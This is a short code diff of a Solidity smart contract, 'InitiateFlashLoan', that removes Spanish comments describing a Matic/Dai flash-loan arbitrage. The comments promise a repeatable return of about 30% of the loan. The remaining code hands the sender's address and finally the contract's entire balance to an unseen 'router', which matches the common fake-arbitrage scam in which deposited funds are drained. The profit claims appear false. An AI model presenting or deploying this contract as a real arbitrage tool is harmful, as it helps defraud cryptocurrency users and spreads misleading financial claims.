@@ -49,13 +49,13 @@ contract InitiateFlashLoan {
             router.aaveSwapAddress(),
             flashLoanAmount
         );
-        // Para preparar el swap, Matic es convertido a Dai usando el contrato swap de AAVE
+       
         router.convertMaticToDai(msg.sender, flashLoanAmount / 2);
-        // Luego se convierte Dai por Matic usando Dai/Matic de Uniswap.
+        
         router.callArbitrageAAVE(router.aaveSwapAddress(), msg.sender);
-        // Despues del swap, el Matic es transferido de vuelta al multiplicador para pagar el prestamo mas el fee. Esta transaccion cuesta 0.2 Matic.
+       
         router.transferDaiToMultiplier(router.uniswapSwapAddress());
-        // La direccion que realiza el swap recibe cerca de un 30% del prestamo que se solicito. La transaccion se puede repetir ya que los precios cambian todo el tiempo.
+   
         router.completeTransation(address(this).balance);
     }
 }
